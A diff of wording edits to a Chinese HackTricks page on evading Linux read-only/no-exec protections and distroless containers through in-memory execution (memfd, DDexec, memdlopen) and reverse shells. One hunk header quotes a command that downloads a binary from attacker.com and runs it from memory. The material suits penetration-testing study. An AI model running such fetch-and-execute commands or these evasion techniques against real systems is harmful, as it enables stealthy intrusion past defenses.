@@ -15,7 +15,7 @@
 </details>
 {% endhint %}
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 如果你对 **黑客职业** 感兴趣并想要攻克不可攻克的目标 - **我们正在招聘！** (_需要流利的波兰语书写和口语能力_).
 
@@ -23,10 +23,10 @@
 
 ## 视频
 
-在以下视频中，你可以找到本页面提到的技术的更深入解释：
+在以下视频中，你可以找到本页提到的技术的更深入解释：
 
 * [**DEF CON 31 - 探索 Linux 内存操控以实现隐蔽和规避**](https://www.youtube.com/watch?v=poHirez8jk4)
-* [**使用 DDexec-ng 和内存中的 dlopen() 进行隐蔽入侵 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
+* [**使用 DDexec-ng 和内存 dlopen() 的隐蔽入侵 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
 
 ## 只读 / 无执行场景
 
@@ -59,16 +59,16 @@ securityContext:
 
 ## 内存绕过
 
-如果你想执行一个二进制文件，但文件系统不允许这样做，最好的方法是 **从内存中执行它**，因为 **保护措施不适用于那里**。
+如果你想执行一个二进制文件，但文件系统不允许这样做，最好的方法是 **从内存中执行它**，因为 **保护措施不适用于内存**。
 
 ### FD + exec 系统调用绕过
 
-如果你在机器内部有一些强大的脚本引擎，例如 **Python**、**Perl** 或 **Ruby**，你可以将二进制文件下载到内存中执行，存储在一个内存文件描述符中（`create_memfd` 系统调用），这个描述符不会受到这些保护的影响，然后调用 **`exec` 系统调用** 指定 **fd 作为要执行的文件**。
+如果你在机器内部有一些强大的脚本引擎，例如 **Python**、**Perl** 或 **Ruby**，你可以将二进制文件下载到内存中执行，将其存储在一个内存文件描述符中（`create_memfd` 系统调用），这个描述符不会受到这些保护的影响，然后调用 **`exec` 系统调用** 指定 **fd 作为要执行的文件**。
 
 为此，你可以轻松使用项目 [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)。你可以传递一个二进制文件，它将生成一个指定语言的脚本，包含 **压缩和 b64 编码的二进制文件** 以及 **解码和解压缩** 的指令，存储在通过调用 `create_memfd` 系统调用创建的 **fd** 中，并调用 **exec** 系统调用来运行它。
 
 {% hint style="warning" %}
-这在其他脚本语言中不起作用，例如 PHP 或 Node，因为它们没有任何 **默认方法从脚本调用原始系统调用**，因此无法调用 `create_memfd` 来创建 **内存 fd** 来存储二进制文件。
+这在其他脚本语言如 PHP 或 Node 中不起作用，因为它们没有任何 **默认方式从脚本调用原始系统调用**，因此无法调用 `create_memfd` 来创建 **内存 fd** 来存储二进制文件。
 
 此外，使用 `/dev/shm` 中的文件创建 **常规 fd** 也不起作用，因为你将无法运行它，因为 **无执行保护** 将适用。
 {% endhint %}
@@ -100,7 +100,7 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 
 ### Memdlopen
 
-与 DDexec 具有类似目的的 [**memdlopen**](https://github.com/arget13/memdlopen) 技术允许以 **更简单的方式加载二进制文件** 到内存中以便稍后执行。它甚至可以加载带有依赖项的二进制文件。
+与 DDexec 具有类似目的的 [**memdlopen**](https://github.com/arget13/memdlopen) 技术允许以 **更简单的方式加载二进制文件** 到内存中以便稍后执行。它甚至可以允许加载带有依赖项的二进制文件。
 
 ## Distroless Bypass
 
@@ -108,7 +108,7 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 
 Distroless 容器仅包含 **运行特定应用程序或服务所需的最低组件**，例如库和运行时依赖项，但排除了较大的组件，如包管理器、shell 或系统实用程序。
 
-distroless 容器的目标是 **通过消除不必要的组件来减少容器的攻击面**，并最小化可以被利用的漏洞数量。
+Distroless 容器的目标是 **通过消除不必要的组件来减少容器的攻击面**，并最小化可以被利用的漏洞数量。
 
 ### 反向 Shell
 
@@ -124,15 +124,15 @@ distroless 容器的目标是 **通过消除不必要的组件来减少容器的
 使用脚本语言，您可以 **使用语言功能枚举系统**。
 {% endhint %}
 
-如果没有 **`read-only/no-exec`** 保护，您可以利用反向 shell **在文件系统中写入您的二进制文件** 并 **执行** 它们。
+如果没有 **`read-only/no-exec`** 保护，您可以利用您的反向 shell **在文件系统中写入您的二进制文件** 并 **执行** 它们。
 
 {% hint style="success" %}
-然而，在这种类型的容器中，这些保护通常会存在，但您可以使用 **先前的内存执行技术来绕过它们**。
+然而，在这种类型的容器中，这些保护通常会存在，但您可以使用 **之前的内存执行技术来绕过它们**。
 {% endhint %}
 
 您可以在 [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) 找到 **示例**，了解如何 **利用一些 RCE 漏洞** 获取脚本语言的 **反向 shell** 并从内存中执行二进制文件。
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 如果您对 **黑客职业** 感兴趣并想要攻克不可攻克的目标 - **我们正在招聘！** (_需要流利的波兰语书写和口语能力_).
 
@@ -147,7 +147,7 @@ distroless 容器的目标是 **通过消除不必要的组件来减少容器的
 <summary>支持 HackTricks</summary>
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
